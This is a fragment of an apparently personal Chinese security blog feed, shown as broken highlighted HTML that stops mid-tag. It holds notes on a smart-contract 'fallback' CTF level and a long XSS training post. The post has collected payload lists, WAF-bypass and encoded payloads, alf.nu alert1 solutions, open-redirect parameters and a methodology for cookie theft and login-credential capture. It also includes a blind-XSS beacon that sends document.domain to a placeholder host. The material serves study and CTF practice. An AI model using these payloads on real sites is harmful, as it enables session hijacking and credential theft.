class="hljs-meta">&gt;</span><span class="bash"> fallback函数，回退函数，是合约里的特殊无名函数，有且仅有一个[1](https://me.tryblockchain.org/blockchain-solidity-fallback.html<span class="hljs-comment">#fn1)。它在合约调用没有匹配到函数签名，或者调用没有带任何数据时被自动调用。</span></span><span class="hljs-meta">&gt;</span><span class="hljs-meta">&gt;</span><span class="bash"> 回退函数是合约里的特殊函数，没有名字，不能有参数，没有返回值。下面来看一个简单的回退函数例子。</span><span class="hljs-meta">&gt;</span><span class="hljs-meta">&gt;</span><span class="bash"> ```text</span><span class="hljs-meta">&gt;</span><span class="bash"> pragma solidity ^0.4.0;</span><span class="hljs-meta">&gt;</span><span class="bash"> </span><span class="hljs-meta">&gt;</span><span class="bash"> contract SimpleFallback&#123;</span><span class="hljs-meta">&gt;</span><span class="bash">   <span class="hljs-function"><span class="hljs-title">function</span></span>()&#123;</span><span class="hljs-meta">&gt;</span><span class="bash">     //fallback <span class="hljs-keyword">function</span></span><span class="hljs-meta">&gt;</span><span class="bash">   &#125;</span><span class="hljs-meta">&gt;</span><span class="bash"> &#125;</span><span class="hljs-meta">&gt;</span></code></pre><p>注意：</p><p>​    在调用send函数时因为没有函数调用会默认调用fallback函数，所以要注意fallback函数要加payable，且在fallback里面不能有写入操作，因为会调用gas而导致无限消耗，DAO就是这样被黑的。</p><blockquote><h3 id="事件"><a href="#事件" class="headerlink" title="事件"></a>事件</h3><p>区块链是打包一系列交易的区块组成的链条，每一个交易“收据”会包含0到多个日志记录，日志代表着智能合约所触发的事件。</p></blockquote><p>回到第一关，</p><p>要调用fallback我们需要给他转账，可以在console里contract.contribute({value:1})</p><p>来转账也可以直接用metamask转账，注意金额要小于0.001,可以注意初始函数中显示的owner的eth是1000</p><p>那么我们要1000/0.001一次转账显然是不可能的现在我们随便调用一个不存在的函数试试？</p><p>叼你妈的，不是可以调用fallback吗？？？操</p><p>走另一条，send函数调用的路子，contract.sendTransaction({value:1})来调用</p><p><img src="/img/block/3.png" srcset="/img/loading.gif" alt=""></p><p>我透？？啥时候合约变成我的了？透再来一次。</p><p>=&gt; Instance address        0xcf71f5f466d0da1ae24721a295695322e2b72a96</p><p><img src="/img/block/4.png" srcset="/img/loading.gif" alt=""></p><p>现在合约不是我的也没贡献，先打钱。</p><p>脑壳痛，打钱他不收，你妈嗨！</p><p>这新合约那么傲娇吗？？？？？？</p><p>哦我知了。。。。。。这尼玛就是前面说的那种，fallback函数里面直接写了状态量，所以会不断消耗gas，刚才我能调用是因为合约owner是我的了，没有发生改变不消耗gas。但为什么console里调用console.contribute()就可以了？？？应该是这种方式没有像send函数那样默认调用fallback</p><p>没解决得到，先留着吧。</p><p>好了现在有了贡献之后就可以用插件给他打钱，并且这个也把owner改为了我们。刚才是因为没贡献就进不到fallback里机会一直卡着</p><h2 id="0x02"><a href="#0x02" class="headerlink" title="0x02"></a>0x02</h2><ul><li><input disabled="" type="checkbox"> <p>怎么在fallback这题里用contribute合约交互把value传进去</p><p>1.console里用contract.contribute({value:1})</p><p>那么用abi交互的方式呢？</p></li><li><input checked="" disabled="" type="checkbox"> <p>这个withdraw函数也不能调用。。。。（没那么多钱。。。合约内就要少很多）</p></li><li><input disabled="" type="checkbox"> </li></ul>]]></content>
    
    
    
    <tags>
      
      <tag>智能合约</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>xss_train</title>
    <link href="/2020/06/19/xss-train/"/>
    <url>/2020/06/19/xss-train/</url>
    
    <content type="html"><![CDATA[<h2 id="xss-fuck"><a href="#xss-fuck" class="headerlink" title="xss fuck"></a>xss fuck</h2><h4 id="收集的payload"><a href="#收集的payload" class="headerlink" title="收集的payload"></a>收集的payload</h4><pre><code class="hljs html"><span class="hljs-tag">&lt;<span class="hljs-name">img</span> <span class="hljs-attr">src</span>=<span class="hljs-string">x</span> <span class="hljs-attr">onerror</span>=<span class="hljs-string">alert(1)</span>&gt;</span><span class="hljs-tag">&lt;/<span class="hljs-name">img</span>&gt;</span><span class="hljs-tag">&lt;<span class="hljs-name">svg</span>/<span class="hljs-attr">onload</span>=<span class="hljs-string">alert(1)</span>&gt;</span><span class="hljs-tag">&lt;/<span class="hljs-name">svg</span>&gt;</span>" onmouseover=alert(1) a="javascript:alert(1)<span class="hljs-tag">&lt;<span class="hljs-name">script</span>&gt;</span>alert(1)<span class="hljs-tag">&lt;/<span class="hljs-name">script</span>&gt;</span><span class="hljs-tag">&lt;<span class="hljs-name">hr</span>&gt;</span>123321<span class="hljs-tag">&lt;<span class="hljs-name">isindex</span> <span class="hljs-attr">type</span>=<span class="hljs-string">image</span> <span class="hljs-attr">src</span>=<span class="hljs-string">1</span> <span class="hljs-attr">onerror</span>=<span class="hljs-string">alert(1)</span>&gt;</span> <span class="hljs-tag">&lt;<span class="hljs-name">isindex</span> <span class="hljs-attr">action</span>=<span class="hljs-string">javascript:alert(1)</span> <span class="hljs-attr">type</span>=<span class="hljs-string">image</span>&gt;</span> <span class="hljs-tag">&lt;<span class="hljs-name">img</span> <span class="hljs-attr">src</span>=<span class="hljs-string">x:alert(alt)</span> <span class="hljs-attr">onerror</span>=<span class="hljs-string">eval(src)</span> <span class="hljs-attr">alt</span>=<span class="hljs-string">0</span>&gt;</span> <span class="hljs-tag">&lt;<span class="hljs-name">x:script</span> <span class="hljs-attr">xmlns:x</span>=<span class="hljs-string">"http://www.w3.org/1999/ xhtml"</span>&gt;</span>alert('xss');<span class="hljs-tag">&lt;/<span class="hljs-name">x:script</span>&gt;</span> "&gt;<span class="hljs-tag">&lt;<span class="hljs-name">iframe</span> <span class="hljs-attr">src</span>=<span class="hljs-string">"data:text/html;base64,PHNjcmlwdD5hbGVydCgiSGVsbG8iKTs8L3NjcmlwdD4#"</span>&gt;</span>a='',b=!a+a,c=!a+b,d=a+&#123;&#125;,e=b[a++],f=𓅂='',𓂀=!𓅂+𓅂,𓁄=!𓂀+𓅂,𓊎=𓅂+&#123;&#125;,𓆣=𓂀 [𓅂++],𓊝=𓂀[𓇎=𓅂],𓏢=++𓇎+𓅂,𓆗=𓊎[𓇎+𓏢],𓂀[𓆗+=𓊎[𓅂]+(𓂀.𓁄+𓊎)[𓅂]+𓁄[𓏢]+𓆣+𓊝+𓂀[𓇎]+𓆗+𓆣+𓊎[𓅂]+𓊝][𓆗](𓁄[𓅂]+𓁄[𓇎]+𓂀[𓏢]+𓊝+𓆣+'`𓅂 𓏢 𓂀 𓁄 𓆣 𓊝 𓇎`')``a='',b=!a+a,c=!b+a,l=a+&#123;&#125;,d=b[a++],e=b[f=a],m=++f+a,n=l[f+m],b[n+=l[a]+(b.c+l)[a]+c[m]+d+e+b[f]+n+d+l[a]+e][n](c[a]+c[f]+b[m]+e+d+'`a m b c d e f`')``<span class="hljs-tag">&lt;<span class="hljs-name">img</span> <span class="hljs-attr">width</span>=<span class="hljs-string">"26"</span> <span class="hljs-attr">height</span>=<span class="hljs-string">"26"</span> <span class="hljs-attr">src</span>=<span class="hljs-string">"https://carry_yourg?x-oss-process=image/resize,w_100,h_100"</span>&gt;</span><span class="hljs-tag">&lt;<span class="hljs-name">m</span> <span class="hljs-attr">onclick</span>=<span class="hljs-string">"alert(1)"</span>&gt;</span>M" alt=""class="chat-avatar"<span class="hljs-symbol">&amp;gt;</span><span class="hljs-tag">&lt;/<span class="hljs-name">m</span>&gt;</span><span class="hljs-tag">&lt;<span class="hljs-name">noscript</span>&gt;</span><span class="hljs-tag">&lt;<span class="hljs-name">p</span> <span class="hljs-attr">title</span>=<span class="hljs-string">" &lt;/noscript&gt;</span></span><span class="hljs-tag"><span class="hljs-string">&lt;style onload= alert(document.domain)//"</span>&gt;</span>*&#123;/*all*/color/*all*/:/*all*/#e84393/*all*/;&#125;<span class="hljs-tag">&lt;/<span class="hljs-name">style</span>&gt;</span>SearchText=%26%2334%3B%3E%3Ca%20href%3D%22%26%230000106%26%23000097%26%230000118%26%23000097%26%230000115%26%23000099%26%230000114%26%230000105%26%230000112%26%230000116%26%23000058%26%23000099%26%230000111%26%230000110%26%230000115%26%230000111%26%230000108%26%230000101%26%23000046%26%230000108%26%230000111%26%230000103%26%23000040%26%23000047%26%230000120%26%230000115%26%230000115%26%23000047%26%23000041%22+onblur%3Dconsole.log+q%3D<span class="hljs-meta">&lt;?xml version="1.0" encoding="UTF-8" standalone="no"?&gt;</span><span class="hljs-meta">&lt;!DOCTYPE <span class="hljs-meta-keyword">svg</span> <span class="hljs-meta-keyword">PUBLIC</span> <span class="hljs-meta-string">"-//W3C//DTD SVG 1.1//EN"</span> <span class="hljs-meta-string">"http://www.w3.org/Graphics/SVG/1.1/DTD/svg11.dtd"</span>&gt;</span><span class="hljs-tag">&lt;<span class="hljs-name">svg</span> <span class="hljs-attr">version</span>=<span class="hljs-string">"1.1"</span> <span class="hljs-attr">id</span>=<span class="hljs-string">"Layer_1"</span> <span class="hljs-attr">xmlns</span>=<span class="hljs-string">"http://www.w3.org/2000/svg"</span> <span class="hljs-attr">xmlns:xlink</span>=<span class="hljs-string">"http://www.w3.org/1999/xlink"</span> <span class="hljs-attr">x</span>=<span class="hljs-string">"0px"</span> <span class="hljs-attr">y</span>=<span class="hljs-string">"0px"</span> <span class="hljs-attr">width</span>=<span class="hljs-string">"100px"</span> <span class="hljs-attr">height</span>=<span class="hljs-string">"100px"</span> <span class="hljs-attr">viewBox</span>=<span class="hljs-string">"0 0 751 751"</span> <span class="hljs-attr">enable-background</span>=<span class="hljs-string">"new 0 0 751 751"</span> <span class="hljs-attr">xml:space</span>=<span class="hljs-string">"preserve"</span>&gt;</span>  <span class="hljs-tag">&lt;<span class="hljs-name">image</span> <span class="hljs-attr">id</span>=<span class="hljs-string">"image0"</span> <span class="hljs-attr">width</span>=<span class="hljs-string">"751"</span> <span class="hljs-attr">height</span>=<span class="hljs-string">"751"</span> <span class="hljs-attr">x</span>=<span class="hljs-string">"0"</span> <span class="hljs-attr">y</span>=<span class="hljs-string">"0"</span></span><span class="hljs-tag">    <span class="hljs-attr">href</span>=<span class="hljs-string">"data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAu8AAALvCAIAAABa4bwGAAAAIGNIUk0AAHomAACAhAAA+gAAAIDo"</span> /&gt;</span><span class="hljs-tag">&lt;<span class="hljs-name">script</span>&gt;</span>alert(1)<span class="hljs-tag">&lt;/<span class="hljs-name">script</span>&gt;</span><span class="hljs-tag">&lt;/<span class="hljs-name">svg</span>&gt;</span>autofocus onfocus=alert(1)style="width: 100vw; height: 100vh; position: fixed; top: 0; left: 0; z-index: 1000;"  全屏<span class="hljs-tag">&lt;<span class="hljs-name">a</span> <span class="hljs-attr">href</span>=<span class="hljs-string">"#"</span> <span class="hljs-attr">autofocus</span> <span class="hljs-attr">onfocus</span>=<span class="hljs-string">"alert(1)"</span> &gt;</span><span class="hljs-tag">&lt;/<span class="hljs-name">a</span>&gt;</span>自动触发testtest<span class="hljs-tag">&lt;<span class="hljs-name">svg</span> <span class="hljs-attr">onload</span>=<span class="hljs-string">alert&amp;lpar;document.domain&amp;#41;</span>&gt;</span>testtest<span class="hljs-tag">&lt;<span class="hljs-name">svg</span> <span class="hljs-attr">onload</span>=<span class="hljs-string">alert&amp;lpar;document.cookie&amp;#41;</span>&gt;</span>testtest"&gt;<span class="hljs-tag">&lt;<span class="hljs-name">a</span> <span class="hljs-attr">href</span>=<span class="hljs-string">javascript&amp;colon;alert&amp;lpar;document.cookie)</span>&gt;</span>    <span class="hljs-tag">&lt;<span class="hljs-name">img</span> <span class="hljs-attr">src</span>=<span class="hljs-string">x:alert(alt)</span> <span class="hljs-attr">onerror</span>=<span class="hljs-string">eval(src)</span> <span class="hljs-attr">alt</span>=<span class="hljs-string">1</span>&gt;</span><span class="hljs-tag">&lt;<span class="hljs-name">form</span>&gt;</span><span class="hljs-tag">&lt;<span class="hljs-name">input</span> <span class="hljs-attr">formaction</span>=<span class="hljs-string">javascript:alert(1)</span> <span class="hljs-attr">type</span>=<span class="hljs-string">submit</span> <span class="hljs-attr">value</span>=<span class="hljs-string">click</span>&gt;</span></code></pre><h4 id="https-alf-nu-alert1"><a href="#https-alf-nu-alert1" class="headerlink" title="https://alf.nu/alert1"></a><a href="https://alf.nu/alert1" target="_blank" rel="noopener">https://alf.nu/alert1</a></h4><p>第一关</p><pre><code class="hljs js"><span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">escape</span>(<span class="hljs-params">s</span>) </span>&#123;  <span class="hljs-keyword">return</span> <span class="hljs-string">'&lt;script&gt;console.log("'</span>+s+<span class="hljs-string">'");&lt;/script&gt;'</span>;&#125;</code></pre><p>显然闭合构造注释”);alert(1)//</p><p>第二关</p><pre><code class="hljs scilab"><span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">escape</span><span class="hljs-params">(s)</span> &#123;</span>  s = s.replace(/<span class="hljs-string">"/g, '</span>\\<span class="hljs-string">"'</span>);  <span class="hljs-keyword">return</span> <span class="hljs-string">'&lt;script&gt;console.log("</span><span class="hljs-string">' + s + '</span><span class="hljs-string">");&lt;/script&gt;'</span>;&#125;</code></pre><p>懵圈，本想换行符绕过应为正则里面没写m，结果不知为啥执行不了叼他妈的。</p><p>换个姿势，报错说是换行符没转义，加个\就正常了，想到用\注释原先的转义符绕过</p><p>\“);alert(1)//</p><p>第三关</p><pre><code class="hljs js"><span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">escape</span>(<span class="hljs-params">s</span>) </span>&#123;  s = <span class="hljs-built_in">JSON</span>.stringify(s);  <span class="hljs-keyword">return</span> <span class="hljs-string">'&lt;script&gt;console.log('</span> + s + <span class="hljs-string">');&lt;/script&gt;'</span>;&#125;&lt;<span class="hljs-regexp">/script&gt;&lt;script&gt;alert(1);/</span><span class="hljs-regexp">/</span></code></pre><p>全转义</p><p>爷给你闭合之前的，再构造</p><p>第四关</p><p><a href="https://alf.nu/alert(1)#accesstoken=6uEjiGpGDYL5CZGWEf5p" target="_blank" rel="noopener">https://alf.nu/alert(1)#accesstoken=6uEjiGpGDYL5CZGWEf5p</a></p><p>过不去，，，</p><p>第五关</p><p><img src="/img/buu/xss_1.png" srcset="/img/loading.gif" alt=""></p><p>经过调试后可以构造createElement来执行function，其中apply的作用和call类似可以把后面的数组作为参数</p><h2 id="url"><a href="#url" class="headerlink" title="url"></a>url</h2><p>跳转参数</p><pre><code class="hljs vim">redirecturlredirectUrl?callbackreturn_urltoUrlReturnUrlfromUrlredUrlrequestredirect_toredirect_urljumpjump_totargettargetUrl<span class="hljs-keyword">to</span><span class="hljs-keyword">goto</span>linklinktodomainoauth_callbackreferrerdomain<span class="hljs-keyword">next</span>service?redirect=http<span class="hljs-variable">s:</span>//baidu.<span class="hljs-keyword">com</span>&amp;url=http<span class="hljs-variable">s:</span>//baidu.<span class="hljs-keyword">com</span>&amp;redirectUrl=url=http<span class="hljs-variable">s:</span>//baidu.<span class="hljs-keyword">com</span>&amp;callback=http<span class="hljs-variable">s:</span>//baidu.<span class="hljs-keyword">com</span>&amp;return_url=http<span class="hljs-variable">s:</span>//baidu.<span class="hljs-keyword">com</span>&amp;ReturnUrl=http<span class="hljs-variable">s:</span>//baidu.<span class="hljs-keyword">com</span>?<span class="hljs-keyword">next</span>=http<span class="hljs-variable">s:</span>//baidu.<span class="hljs-keyword">com</span>&amp;redirect_url=http<span class="hljs-variable">s:</span>//baidu.<span class="hljs-keyword">com</span>&amp;redirect_uri=http<span class="hljs-variable">s:</span>//baidu.<span class="hljs-keyword">com</span>&amp;target=http<span class="hljs-variable">s:</span>//baidu.<span class="hljs-keyword">com</span>&amp;<span class="hljs-keyword">continue</span>=http<span class="hljs-variable">s:</span>//baidu.<span class="hljs-keyword">com</span></code></pre><p>跳转</p><pre><code class="hljs routeros">&lt;meta <span class="hljs-attribute">http-equiv</span>=<span class="hljs-string">"Refresh"</span> <span class="hljs-attribute">content</span>=<span class="hljs-string">"1; url=http://www.baidu.com"</span>/&gt;history.go(-1),history.back(-1)location.<span class="hljs-attribute">href</span>=<span class="hljs-string">'//baidu.com'</span> 服务端的url重定向 location.replace(<span class="hljs-string">'//baidu.com'</span>)&lt;a <span class="hljs-attribute">href</span>=<span class="hljs-string">"http://baidu.com"</span>&gt;百度一下&lt;/a&gt;</code></pre><p>编码</p><pre><code class="hljs angelscript">&amp;quot; &amp;#<span class="hljs-number">34</span>;&amp;#<span class="hljs-number">000034</span></code></pre><p>探针</p><pre><code class="hljs livescript">jaVasCript:<span class="hljs-comment">/*-/*`/*\`/*'/*"/**/</span>(<span class="hljs-comment">/* */</span>oNcliCk=alert() ) <span class="hljs-regexp">//%0D%0A%0d%0a//</span>&lt;<span class="hljs-regexp">/stYle/</span>&lt;<span class="hljs-regexp">/titLe/</span>&lt;<span class="hljs-regexp">/teXtarEa/</span>&lt;<span class="hljs-regexp">/scRipt/</span>--!&gt; <span class="hljs-string">\x3csVg/&lt;sVg/oNloAd=alert()//&gt;\x3e</span></code></pre><p>bypass waf</p><pre><code class="hljs xml">1.<span class="hljs-tag">&lt;<span class="hljs-name">style</span>&gt;</span><span class="css"><span class="hljs-keyword">@keyframes</span> x&#123;&#125;</span><span class="hljs-tag">&lt;/<span class="hljs-name">style</span>&gt;</span><span class="hljs-tag">&lt;<span class="hljs-name">div</span> <span class="hljs-attr">style</span>=<span class="hljs-string">"animation-name:x"</span> <span class="hljs-attr">onanimationstart</span>=<span class="hljs-string">"alert(1)"</span>&gt;</span><span class="hljs-tag">&lt;/<span class="hljs-name">div</span>&gt;</span>2.<span class="hljs-tag">&lt;<span class="hljs-name">math</span> <span class="hljs-attr">href</span>=<span class="hljs-string">"javascript:alert(1)"</span>&gt;</span>CLICKME<span class="hljs-tag">&lt;/<span class="hljs-name">math</span>&gt;</span> firefox3.<span class="hljs-tag">&lt;<span class="hljs-name">area</span> <span class="hljs-attr">href</span>=<span class="hljs-string">"javascript:alert(1)"</span> <span class="hljs-attr">style</span>=<span class="hljs-string">"display:block;height:100vh;width:100vw"</span>&gt;</span>click4.<span class="hljs-tag">&lt;<span class="hljs-name">svg</span>&gt;</span><span class="hljs-tag">&lt;<span class="hljs-name">circle</span>&gt;</span><span class="hljs-tag">&lt;<span class="hljs-name">set</span> <span class="hljs-attr">onbegin</span>=<span class="hljs-string">prompt(1)</span> <span class="hljs-attr">attributename</span>=<span class="hljs-string">fill</span>&gt;</span>5.<span class="hljs-tag">&lt;<span class="hljs-name">form</span>&gt;</span><span class="hljs-tag">&lt;<span class="hljs-name">input%20type=submit%20formaction=%27java%0a%0ascri%0a%0dPt:var%20a="al%0a%0dert(1)";Function(a)()%27</span>&gt;</span>eeee6.<span class="hljs-tag">&lt;<span class="hljs-name">object</span> <span class="hljs-attr">data</span>=<span class="hljs-string">"data:text/html;base64,PHNjcmlwdD5hbGVydCgxKTwvc2NyaXB0Pg=="</span>&gt;</span><span class="hljs-tag">&lt;/<span class="hljs-name">object</span>&gt;</span>7.<span class="hljs-tag">&lt;<span class="hljs-name">a</span> <span class="hljs-attr">href</span>=<span class="hljs-string">"javascript:alert(1)"</span>&gt;</span>8.<span class="hljs-tag">&lt;<span class="hljs-name">embed</span> <span class="hljs-attr">src</span>=<span class="hljs-string">"javascript:alert(1)"</span>&gt;</span> firefox data:text/html;base64,PHNjcmlwdD5hbGVydCgxKTwvc2NyaXB0Pg==9.<span class="hljs-tag">&lt;<span class="hljs-name">iframe</span> <span class="hljs-attr">src</span>=<span class="hljs-string">"javascript:alert(1)"</span>&gt;</span> data:text/html;base64,PHNjcmlwdD5hbGVydCgxKTwvc2NyaXB0Pg==10.<span class="hljs-tag">&lt;<span class="hljs-name">iframe</span> <span class="hljs-attr">srcdoc</span>=<span class="hljs-string">"&lt;svg/onload=alert(1)&gt;"</span>&gt;</span>11.<span class="hljs-tag">&lt;<span class="hljs-name">input</span> <span class="hljs-attr">type</span>=<span class="hljs-string">"search"</span> <span class="hljs-attr">onsearch</span>=<span class="hljs-string">"alert(1)"</span>&gt;</span>12.<span class="hljs-tag">&lt;<span class="hljs-name">form</span> <span class="hljs-attr">action</span>&gt;</span><span class="hljs-tag">&lt;<span class="hljs-name">input</span> <span class="hljs-attr">type</span>=<span class="hljs-string">"submit"</span> <span class="hljs-attr">formaction</span>=<span class="hljs-string">"javascript:alert(1)"</span>&gt;</span><span class="hljs-tag">&lt;/<span class="hljs-name">form</span>&gt;</span>13.<span class="hljs-tag">&lt;<span class="hljs-name">form</span> <span class="hljs-attr">action</span>=<span class="hljs-string">"javascript:alert(1)"</span>&gt;</span><span class="hljs-tag">&lt;<span class="hljs-name">input</span> <span class="hljs-attr">type</span>=<span class="hljs-string">"submit"</span>&gt;</span><span class="hljs-tag">&lt;/<span class="hljs-name">form</span>&gt;</span>oncanplayontouchstartontouchmoveontouchendontouchcancelonpageshow</code></pre><pre><code class="hljs yaml"><span class="hljs-string">网站业务分析</span> <span class="hljs-number">1</span><span class="hljs-string">.熟悉开发人员</span><span class="hljs-number">1</span><span class="hljs-string">.熟悉网站开发的前后端使用技术，客户端渲染？服务端渲染？，熟悉开发使用的语言与框架，前端：html，js，jquery，vue，react...？，后端：php，python，java，nodejs，.net...？</span><span class="hljs-number">2</span><span class="hljs-string">.熟悉开发者开发习惯，前端的标签，函数命名习惯等...，js代码执行逻辑，熟悉开发者的请求接口命名习惯，服务端返回的数据格式，前端请求方式，form表单，xhr，ajax，fetch，jsonp...</span><span class="hljs-number">2</span><span class="hljs-string">.熟悉应用业务功能</span><span class="hljs-number">1</span><span class="hljs-string">.通过搜索引擎，企业查询，第三方信息整合平台，了解应用业务功能，社交，信息搜索，门户网站，管理系统...。熟悉网站的功能，评论，文件上传，即时通讯...</span><span class="hljs-number">2</span><span class="hljs-string">.熟悉应用的功能实现，注册，登录，信息修改，聊天功能等前后端实现逻辑</span><span class="hljs-number">3</span><span class="hljs-string">.分析功能点的业务风险xss,csrf,url跳转...，掌握常见业务风险点测试流程。强化测试思路，掌握利用方式。</span><span class="hljs-string">常见web安全漏洞</span><span class="hljs-number">1.</span><span class="hljs-string">url跳转</span><span class="hljs-number">1</span><span class="hljs-string">.产生该漏洞的原因，位置？登录回跳，支付回跳...漏洞危害，利用方式</span><span class="hljs-string">常见跳转参数：</span><span class="hljs-string">redirect</span><span class="hljs-string">url</span><span class="hljs-string">redirectUrl</span><span class="hljs-string">callback</span><span class="hljs-string">return_url</span><span class="hljs-string">toUrl</span><span class="hljs-string">ReturnUrl</span><span class="hljs-string">fromUrl</span><span class="hljs-string">redUrl</span><span class="hljs-string">request</span><span class="hljs-string">redirect_to</span><span class="hljs-string">redirect_url</span><span class="hljs-string">jump</span><span class="hljs-string">jump_to</span><span class="hljs-string">target</span><span class="hljs-string">targetUrl</span><span class="hljs-string">to</span><span class="hljs-string">goto</span><span class="hljs-string">link</span><span class="hljs-string">linkto</span><span class="hljs-string">domain</span><span class="hljs-string">oauth_callback</span><span class="hljs-string">referrerdomain</span><span class="hljs-string">next</span><span class="hljs-string">利用方式:</span><span class="hljs-string">钓鱼网站</span><span class="hljs-string">javascript协议的xss</span><span class="hljs-string">携带用户敏感信息，token跳转</span><span class="hljs-string">常见payload:</span><span class="hljs-string">Plain</span> <span class="hljs-string">Text</span><span class="hljs-number">1</span><span class="hljs-string">.?reidrect=https://baidu.com</span><span class="hljs-number">2</span><span class="hljs-string">.?reidrect=https://a.com@b.com</span><span class="hljs-number">3</span><span class="hljs-string">.?reidrect=//b.com</span><span class="hljs-number">4</span><span class="hljs-string">.?reidrect=javascript:alert(1)</span><span class="hljs-number">5</span><span class="hljs-string">.?reidrect=@baidu.com</span>﻿﻿<span class="hljs-number">2.</span><span class="hljs-string">Xss</span><span class="hljs-number">1</span><span class="hljs-string">.熟悉xss常见的输出位置，搜索，评论，内容渲染，形成的原理，危害，常见利用方式（盗取用户cookie，实现无账号密码登录其他用户网页，所cookie为httponly，可通过js代码让用户发送任意请求），xss的不同类型：</span><span class="hljs-string">反射型xss：直接响应html代码，如&lt;script&gt;alert(1)&lt;/script&gt;，&lt;img</span> <span class="hljs-string">src=x</span> <span class="hljs-string">onerro=alert(1)&gt;，在页面直接触发，</span><span class="hljs-string">储存型：将输入内容储存至数据库，并在访问该内容时触发</span><span class="hljs-string">dom型：只通过一定用户交互或在客户端js代码执行过程中触发</span><span class="hljs-number">2</span><span class="hljs-string">.如何发现xss漏洞，查找输入点，输入框，url参数，审计代码，查找输出点，通过搜索代码中的输入内容检索代码中出现的位置，次数，观察过滤规则，是否过滤了&lt;&gt;,",'等特殊符号</span><span class="hljs-number">3</span><span class="hljs-string">.输出在不同位置的常见payload：</span><span class="hljs-string">直接输出在html中：</span><span class="hljs-string">Plain</span> <span class="hljs-string">Text</span><span class="hljs-string">&lt;svg</span> <span class="hljs-string">onload=alert(1)&gt;</span><span class="hljs-string">输出在html属性中且"，&gt;没被过滤：</span><span class="hljs-string">Plain</span> <span class="hljs-string">Text</span><span class="hljs-string">"&gt;&lt;svg onload=alert(1)//&gt;</span><span class="hljs-string">输出在html属性中且&gt;被过滤，"</span><span class="hljs-string">没被过滤：</span><span class="hljs-string">Plain</span> <span class="hljs-string">Text</span><span class="hljs-string">"autofocus onfocus=alert(1)//</span><span class="hljs-string">输出在js字符串中且"</span><span class="hljs-string">被过滤，&lt;&gt;没被过滤：</span><span class="hljs-string">Plain</span> <span class="hljs-string">Text</span><span class="hljs-string">&lt;/script&gt;&lt;script&gt;alert(1)//</span><span class="hljs-string">输出在js字符串中且&lt;&gt;被过滤，"没被过滤：</span><span class="hljs-string">Plain</span> <span class="hljs-string">Text</span><span class="hljs-string">"-alert(1)//</span><span class="hljs-string">输出在a标签href或iframe的src属性中:</span><span class="hljs-string"></span><span class="hljs-string">Plain Text</span><span class="hljs-string">javascript:alert(1)</span><span class="hljs-string">输出在html注释中：</span><span class="hljs-string"></span><span class="hljs-string">Plain Text</span><span class="hljs-string">--&gt;&lt;svg onload=alert(1)//&gt;</span><span class="hljs-string">输出在js单行注释中：</span><span class="hljs-string"></span><span class="hljs-string">Plain Text</span><span class="hljs-string">%0aalert(1)//</span><span class="hljs-string">输出在js多行注释中：</span><span class="hljs-string"></span><span class="hljs-string">Plain Text</span><span class="hljs-string">*/alert(1)/*</span><span class="hljs-string"></span><span class="hljs-string"></span><span class="hljs-string">一些特殊的payload</span><span class="hljs-string"></span><span class="hljs-string">&lt;body%20onpageshow=alert(1)&gt;</span><span class="hljs-string"></span><span class="hljs-string">&lt;details ontoggle=alert(1) open&gt;test&lt;/details&gt;</span><span class="hljs-string"></span><span class="hljs-string">&lt;a autofocus onfocus=alert(1) href="</span><span class="hljs-comment">#"&gt;x&lt;/a&gt;</span><span class="hljs-string">--&gt;&lt;/script&gt;&lt;script&gt;alert(1)&lt;/script&gt;&lt;!--&lt;script&gt;</span><span class="hljs-string">&lt;video</span> <span class="hljs-string">src=http://1252524126.vod2.myqcloud.com/2919df88vodtranscq1252524126/0c702fd15285890790259780332/v.f30.mp4</span> <span class="hljs-string">controls</span> <span class="hljs-string">oncanplay=alert(1)&gt;</span><span class="hljs-string">（对输出在js中且能打破原本结构的payload需要构造正确的js语法）</span><span class="hljs-number">4</span><span class="hljs-string">.熟悉编码的使用，url编码，html编码，url编码通常用于服务端无法正常接收一些特殊符号导致页面无妨访问，或内容输出在html内且特殊符号被过滤的情况，再使用html编码进行绕过时在通过url编码该内容，（通常html编码后的内容符号在url中有特殊含义，如&amp;lt;为&lt;的html编码，&amp;本身在url表示参数拼接，此时应该再对html编码后的内容进行url编码避免符号冲突）</span><span class="hljs-number">5</span><span class="hljs-string">，观察利用方式，如结合本地存储的xss进行利用。对出现在登录位置的xss观察是否能直接拦截账号密码，常用测试语句，如url跳转中的xss(此处的元素id名应根据具体情况更换):</span><span class="hljs-string">Plain</span> <span class="hljs-string">Text</span><span class="hljs-string">javascript:prompt(document.getElementById(`loginName`).value,document.getElementById(`loginPwd`).value)</span><span class="hljs-number">6</span><span class="hljs-string">.对于盲注类型的xss，通过</span><span class="hljs-string">Plain</span> <span class="hljs-string">Text</span><span class="hljs-string">&lt;script&gt;new</span> <span class="hljs-string">Image().src="//xxx.com?"+document.domain</span> <span class="hljs-string">&lt;/script&gt;</span><span class="hljs-string">或其他能执行js的payload验证获取到主机名即可</span><span class="hljs-string">7xss一句话</span><span class="hljs-string">Plain</span> <span class="hljs-string">Text</span><span class="hljs-string">jaVasCript:/*-/*`/*\`/*'/*"/**/(/*</span> <span class="hljs-string">*/oNcliCk=alert()</span> <span class="hljs-string">)</span><span class="hljs-string">//%0D%0A%0d%0a//&lt;/stYle/&lt;/titLe/&lt;/teXtarEa/&lt;/scRipt/--!&gt;\x3csVg/&lt;sVg/oNloAd=alert()//&gt;\x3e</span>﻿﻿<span class="hljs-number">3.</span><span class="hljs-string">Csrf</span><span class="hljs-number">1</span><span class="hljs-string">.发现方式：观察应用是否有对用户发送的请求做验证，通常为检测referer或csrf_token,若未验证通过自己写html页面（b页面）并发送请求修改原网站（a页面）的某些用户信息，若访问b页面时请求发送成功并被响应，a网页信息修改成功，则证明此网站存在csrf漏洞，</span><span class="hljs-number">2</span><span class="hljs-string">.位置，通常可在评论，留言，私信等位置留下链接用户在访问时将可能受到攻击，出现较多的情况：</span><span class="hljs-number">1</span><span class="hljs-string">.发布信息的处，发布链接，或图片资源，用户在访问该链接时触发，影响范围为在访问该发布内容的用户</span><span class="hljs-number">2</span><span class="hljs-string">.评论，评论链接，图片资源，用户在访问该内容触发，影响范围为所有访问该内容的用户</span><span class="hljs-number">3</span><span class="hljs-string">.用户头像，或前面等位置的图片或链接，比较隐蔽</span><span class="hljs-number">4</span><span 